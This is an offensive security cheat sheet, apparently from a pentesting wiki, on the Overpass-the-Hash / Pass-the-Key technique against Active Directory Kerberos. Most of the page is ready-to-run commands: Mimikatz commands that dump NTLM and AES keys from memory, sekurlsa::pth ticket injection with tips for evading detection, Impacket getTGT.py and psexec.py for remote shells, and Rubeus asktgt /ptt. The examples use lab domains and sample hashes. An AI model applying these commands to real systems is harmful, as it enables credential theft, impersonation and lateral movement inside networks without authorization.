# Overpass the Hash /                Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.

In the case of over-pass-hash, we are generating the things that would get us that original TGT in memory on the windows client then fronting up to the domain controller for a service ticket to the thing we want access to, and automatically getting the TGT back as part of the exchange so that we can go on and request all access we want to other things.

{% hint style="info" %}
In order to perform this attack, the **NTLM hash (or password) of the target user account is needed**. Thus, once a user hash is obtained, a TGT can be requested for that account. Finally, it is possible to **access** any service or machine **where the user account has permissions**.
{% endhint %}

## <mark style="color:red;">Grab the Target User Hash</mark>

In the target machine run this and dump the NTLM hash of the 'target-user' account:

```
privilege::debug
sekurlsa::ekeys
Sekurlsa::logonpasswords
```

With the help of ekeys you will able to fetch all keys NTLM (RC4), AES128, AES256 key







## <mark style="color:red;">Overpass the Hash</mark>

So with the help of sekurlsa::pth command we try to use ase256 key or aes128 for Kerberos ticket, it is difficult to detect because it is the more common and secure key used in encryption.

Using our new hash, we issue the command:

```
sekurlsa::pth /user:target-user /domain:megabank.local /ntlm:89551acff8895768e489bb3054af94fd

# example
sekurlsa::pth /user:Administrator /domain:ignite.local /aes256:9c83452b5dcdca4b0bae7e89407c700bed3153c31dca06a8d7be29d98e13764c
sekurlsa::pth /user:Administrator /domain:ignite.local /aes128:b5c9a38d8629e87f5da0a0ff2c67f84c
```

#### If you will use NTLM (RC4), ASE128, ASE256 simultaneously for injecting into Kerberos ticket, this step is more secure and undetectable in the network.

```
sekurlsa::pth /user:Administrator /domain:igntie.local /ntlm:a29f7623fd11550def0192de9246f46b /aes128:b5c9a38d8629e87f5da0a0ff2c67f84c /aes256:9c83452b5dcdca4b0bae7e89407c700bed3153c31dca06a8d7be29d98e13764c
sekurlsa::pth /user:Administrator /domain:igntie.local /ntlm:a29f7623fd11550def0192de9246f46b
```

#### We should be able to now move from our shell that was running as whomever , to a shell with 'target-user' credentials.

we can use getTGT.py script from impacket toolkit as well:

### <mark style="color:orange;">Impacket</mark>

```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```

You can **specify** `-aesKey [AES key]` to specify to use **AES256**. You can also use the ticket with other tools like: as smbexec.py or wmiexec.py

```
python getTGT.py -dc-ip 192.168.1.105 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator
```

with the help of above command, you will be able to request Kerberos authorized ticket in the form of ccache whereas with the help of the following command you will be able to inject the ticket to access the resource.

```
export KRB5CCNAME=Administrator.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/Administrator@WIN-S0V7KMTVLD2.ignite.local
```

### <mark style="color:orange;">Rubeus</mark>

{% embed url="https://github.com/GhostPack/Rubeus" %}

```
Rubeus.exe asktgt /domain:igntie.local /user:Administrator /rc4: 32196b56ffe6f45e294117b91a83bf38 /ptt
```
